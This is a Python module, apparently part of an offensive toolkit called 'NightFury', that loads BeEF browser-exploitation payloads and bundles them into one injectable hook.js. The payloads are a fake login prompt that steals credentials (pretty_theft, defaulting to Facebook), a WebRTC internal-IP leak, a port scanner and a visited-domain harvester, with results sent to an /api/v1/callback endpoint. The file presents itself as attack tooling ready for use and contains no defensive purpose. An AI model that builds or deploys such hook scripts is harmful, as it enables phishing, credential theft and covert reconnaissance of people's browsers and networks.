import os
import re
import yaml
from core.error_handler import handle_exception

class BeEFIntegration:
    """
    Integrates re-engineered BeEF modules into NightFury.
    Focuses on payload generation for Web Exploitation and OSINT.
    """
    def __init__(self, base_path="/opt/nightfury/modules/beef_integration/payloads"):
        # Fallback to local path if /opt doesn't exist yet
        if not os.path.exists(base_path):
            base_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
        self.base_path = base_path
        self.payloads = {
            "pretty_theft": "social_engineering/pretty_theft",
            "internal_ip": "get_internal_ip_webrtc",
            "port_scanner": "port_scanner",
            "visited_domains": "get_visited_domains"
        }

    def get_payload(self, name, config_overrides=None):
        """
        Retrieves and prepares a BeEF-based payload.
        """
        try:
            payload_dir = os.path.join(self.base_path, name)
            command_js_path = os.path.join(payload_dir, "command.js")
            
            if not os.path.exists(command_js_path):
                # Fallback for nested structure
                rel_path = self.payloads.get(name, "")
                payload_dir = os.path.join(self.base_path, rel_path)
                command_js_path = os.path.join(payload_dir, "command.js")

            if not os.path.exists(command_js_path):
                raise FileNotFoundError(f"Payload {name} not found at {command_js_path}")

            with open(command_js_path, 'r') as f:
                js_content = f.read()

            # Re-engineer: Remove BeEF-specific placeholders or replace with NightFury ones
            js_content = js_content.replace("<%= @command_url %>", "/api/v1/callback")
            js_content = js_content.replace("<%= @command_id %>", "0")
            
            # Handle pretty_theft specific placeholders
            if name == "pretty_theft":
                choice = config_overrides.get("choice", "Facebook") if config_overrides else "Facebook"
                js_content = js_content.replace("<%= @choice %>", choice)
                js_content = js_content.replace("<%== @backing %>", "Grey")

            return js_content
        except Exception as e:
            handle_exception(e, {"module": "beef_integration", "payload": name})
            raise e

    def generate_hook_script(self, modules_to_include):
        """
        Generates a unified hook.js containing multiple modules.
        """
        hook_js = "// NightFury Hook Script - Integrated BeEF Modules\n"
        hook_js += "var nightfury = { callback: function(data) { console.log('NF Data:', data); } };\n"
        
        for mod in modules_to_include:
            try:
                payload = self.get_payload(mod)
                hook_js += f"\n// Module: {mod}\n"
                hook_js += payload
            except Exception as e:
                hook_js += f"\n// Error loading {mod}: {str(e)}\n"
        
        return hook_js

if __name__ == "__main__":
    # Test
    beef = BeEFIntegration()
    print("BeEF Integration Initialized")
